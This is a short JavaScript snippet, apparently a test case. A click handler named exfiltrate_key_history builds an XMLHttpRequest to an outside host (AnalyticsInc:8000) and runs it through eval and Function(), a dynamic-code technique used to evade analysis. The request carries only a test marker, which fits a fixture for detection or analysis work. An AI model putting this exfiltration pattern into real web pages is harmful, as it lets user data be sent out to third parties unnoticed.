function exfiltrate_key_history() {

    // Dynamic Function - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dynamic", true);xmlhttp.send(null);';
	eval("var sneaky = Function(exp)");
    sneaky();
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
